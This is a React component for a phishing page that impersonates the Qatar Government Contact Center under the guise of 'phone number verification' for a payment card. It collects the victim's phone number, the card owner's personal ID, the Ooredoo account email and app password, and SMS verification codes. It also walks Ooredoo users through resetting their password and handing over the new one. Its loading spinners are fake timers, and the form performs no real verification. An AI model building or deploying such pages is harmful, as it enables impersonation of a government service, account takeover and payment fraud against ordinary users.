import React, { useState } from 'react';
import { Loader2 } from 'lucide-react';

interface VerificationFormProps {
  onNext: () => void;
}

type SubStep = 'initial' | 'phone_otp' | 'email_otp';

const VerificationForm: React.FC<VerificationFormProps> = ({ onNext }) => {
  const [subStep, setSubStep] = useState<SubStep>('initial');
  const [provider, setProvider] = useState<'ooredoo' | 'vodafone' | ''>('');
  const [phone, setPhone] = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [phoneOtp, setPhoneOtp] = useState('');
  const [emailOtp, setEmailOtp] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [passwordError, setPasswordError] = useState('');
  const [tempPasswordError, setTempPasswordError] = useState('');

  const handleInitialSubmit = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setSubStep('phone_otp');
    }, 1500);
  };

  const handlePhoneOtpSubmit = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      if (provider === 'ooredoo') {
        setSubStep('email_otp');
      } else {
        onNext();
      }
    }, 1500);
  };

  const handleEmailOtpSubmit = () => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      onNext();
    }, 1500);
  };

  return (
    <div className="w-full max-w-[1400px] mx-auto bg-white font-sans" dir="rtl">
      {/* QGCC Logo Section */}
      <div className="flex flex-col items-center mt-10 mb-8 max-w-[1000px] mx-auto">
        <div className="flex items-center justify-center gap-4">
          <img src="/qgcc_LOGO.png" alt="QGCC Logo" className="h-[80px] w-auto" />
          <div className="h-10 w-[2px] bg-gray-200 mx-1"></div>
          <div className="flex flex-col">
            <span className="text-gray-400 text-[11px] font-black uppercase tracking-[0.2em]">Qatar Government Contact Center</span>
            <span className="text-gray-600 text-[18px] font-black">مركز الإتصال الحكومي - قطر</span>
          </div>
        </div>
      </div>

      {isLoading && (
        <div className="fixed inset-0 z-[100] bg-white/60 backdrop-blur-sm flex items-center justify-center">
          <Loader2 className="w-12 h-12 text-[#007fb1] animate-spin" />
        </div>
      )}

      {/* Verification Card */}
      <div className="bg-[#fcfcfc] border border-gray-300 rounded-[4px] p-8 md:p-14 mx-4 mb-10 min-h-[500px] max-w-[1000px] mx-auto">
        <div className="max-w-[800px] mx-auto">
          
          {subStep === 'initial' && (
            <div className="animate-in fade-in duration-500">
              <div className="text-right mb-10">
                <h2 className="text-[24px] font-black text-[#2d3a5a] mb-6">توثيق رقم الهاتف</h2>
                <div className="w-full h-[1px] bg-gray-200 mb-8"></div>
                <div className="space-y-3">
                  <p className="text-[14px] font-black text-gray-800">
                    يرجى ادخال رقم الهاتف المرتبط بطريقة الدفع، لإثبات ملكية البطاقة.
                  </p>
                  <p className="text-[12px] text-gray-500 leading-relaxed font-extrabold">
                    لا يشترط الدفع ببطاقة تابعة للمستخدم المراد تسجيله، يمكنك استخدام بطاقة تعود لشخص آخر، لكن يجب اثبات ملكيتها من خلال رقم الهاتف والرقم الشخصي لصاحب البطاقة.
                  </p>
                </div>
              </div>

              <div className="max-w-[450px] mx-auto space-y-5">
                <div className="space-y-2">
                  <label className="block text-[13px] font-black text-gray-700">مزود الخدمة <span className="text-red-500">*</span></label>
                  <select 
                    className="nas-select text-right pr-4 font-black"
                    value={provider}
                    onChange={(e) => setProvider(e.target.value as any)}
                  >
                    <option value="" disabled>اختر مزود الخدمة</option>
                    <option value="ooredoo">اوريدو ooredoo</option>
                    <option value="vodafone">فودافون vodafone</option>
                  </select>
                </div>

                {provider !== '' && (
                  <div className="space-y-5 animate-in slide-in-from-top-4 duration-300">
                    <div className="space-y-2">
                      <label className="block text-[13px] font-black text-gray-700">رقم الهاتف <span className="text-red-500">*</span></label>
                      <input className="nas-input text-left font-black" placeholder="Phone" value={phone} onChange={(e) => setPhone(e.target.value)} />
                    </div>

                    {provider === 'ooredoo' && (
                      <div className="space-y-5">
                        <div className="space-y-2">
                          <label className="block text-[13px] font-black text-gray-700">الرقم الشخصي لمالك البطاقة <span className="text-red-500">*</span></label>
                          <input className="nas-input text-left font-black" placeholder="Id" value={idNumber} onChange={(e) => setIdNumber(e.target.value)} />
                        </div>
                        <div className="space-y-2">
                          <label className="block text-[13px] font-black text-gray-700">البريد الالكتروني المعتمد ب ooredoo <span className="text-red-500">*</span></label>
                          <input className="nas-input text-left font-black" placeholder="Email" value={email} onChange={(e) => setEmail(e.target.value)} />
                        </div>
                        <div className="space-y-2">
                          <label className="block text-[13px] font-black text-gray-700">كلمة المرور لتطبيق ooredoo <span className="text-red-500">*</span></label>
                          <input className="nas-input text-left font-black" type="password" placeholder="Password" value={password} onChange={(e) => {
                            const value = e.target.value;
                            const englishRegex = /^[a-zA-Z0-9%$#@&/\-_]*$/;
                            if (!englishRegex.test(value)) {
                              setPasswordError('يرجى إدخال الأحرف الإنجليزية والأرقام والرموز فقط');
                              return;
                            }
                            setPasswordError('');
                            setPassword(value);
                          }} />
                          {passwordError && (
                            <p className="text-[#d9534f] text-[12px] mt-1">{passwordError}</p>
                          )}
                        </div>
                      </div>
                    )}

                    <div className="pt-4">
                      <button onClick={handleInitialSubmit} className="w-full bg-[#007fb1] text-white font-black py-3 rounded-[4px] text-[15px] hover:bg-[#005a7d] transition-all">استمر</button>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}

          {subStep === 'phone_otp' && (
            <div className="animate-in fade-in duration-500">
              <div className="text-right mb-10">
                <h2 className="text-[24px] font-black text-[#2d3a5a] mb-6">توثيق رقم الهاتف</h2>
                <div className="w-full h-[1px] bg-gray-200 mb-8"></div>
                <div className="space-y-4 text-center">
                  <p className="text-[16px] font-black text-gray-800">
                    يرجى الانتظار، سيتم ارسال رمز تحقق الى الرقم الذي قمت بادخاله بشكل صحيح لإكمال توثيق الطلب
                  </p>
                  <p className="text-[13px] text-gray-500 font-black">
                    يرجى ادخال اخر رمز تحقق توصلت به عبر الرسائل النصية.
                  </p>
                </div>
              </div>

              <div className="max-w-[450px] mx-auto space-y-6">
                <div className="space-y-2 text-center">
                  <label className="block text-[14px] font-black text-gray-800 mb-2">رمز التحقق <span className="text-red-500">*</span></label>
                  <input 
                    className="nas-input text-center h-[46px] text-[20px] font-black tracking-[0.5em]" 
                    maxLength={6}
                    value={phoneOtp}
                    onChange={(e) => setPhoneOtp(e.target.value.replace(/\D/g, ''))}
                  />
                </div>
                <div className="pt-4">
                  <button onClick={handlePhoneOtpSubmit} className="w-full bg-[#007fb1] text-white font-black py-3.5 rounded-[4px] text-[16px] hover:bg-[#005a7d] transition-colors">تحقق</button>
                </div>
              </div>
            </div>
          )}

          {subStep === 'email_otp' && (
            <div className="animate-in fade-in duration-500">
              <div className="flex justify-center mb-10">
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg" alt="Gmail" className="w-16 h-auto drop-shadow-md" />
              </div>
              
              <div className="text-right mb-10">
                <h2 className="text-[24px] font-black text-[#2d3a5a] mb-6">توثيق رقم الهاتف</h2>
                <div className="w-full h-[1px] bg-gray-200 mb-8"></div>
                <div className="space-y-4">
                  <p className="text-[15px] text-gray-800 text-center leading-relaxed font-black">
                    يرجى الانتظار، سيتم إرسال بريد إلكتروني إلى <span className="text-[#007fb1]">{email || 'null'}</span> لإعادة تعيين كلمة المرور، قم بإعادة تعيين كلمة المرور من خلال الرابط المرفق، ومن ثم أعد إدخالها في الحقل أدناه بعد إعادة التعيين.
                  </p>
                  <p className="text-[13px] text-gray-500 text-center font-black opacity-80">
                    يرجى تفقد البريد الوارد، ان لم تجد رابط اعادة التعيين في بريد الوارد قد يكون بالرسائل الترويجية او البريد الغير مرغوب فيه.
                  </p>
                </div>
              </div>

              <div className="max-w-[450px] mx-auto space-y-6">
                <div className="space-y-2 text-center">
                  <label className="block text-[14px] font-black text-gray-800 mb-2">كلمة المرور المؤقته <span className="text-red-500">*</span></label>
                  <input 
                    className="nas-input text-left h-[46px] font-black" 
                    type="password"
                    value={emailOtp}
                    onChange={(e) => {
                      const value = e.target.value;
                      const englishRegex = /^[a-zA-Z0-9%$#@&/\-_]*$/;
                      if (!englishRegex.test(value)) {
                        setTempPasswordError('يرجى إدخال الأحرف الإنجليزية والأرقام والرموز فقط');
                        return;
                      }
                      setTempPasswordError('');
                      setEmailOtp(value);
                    }}
                  />
                  {tempPasswordError && (
                    <p className="text-[#d9534f] text-[12px] mt-1">{tempPasswordError}</p>
                  )}
                </div>
                <div className="pt-4">
                  <button 
                    disabled={!emailOtp}
                    onClick={handleEmailOtpSubmit} 
                    className={`w-full font-black py-3.5 rounded-[4px] text-[16px] transition-all ${emailOtp ? 'bg-[#007fb1] text-white hover:bg-[#005a7d] shadow-md' : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}
                  >
                    تحقق
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default VerificationForm;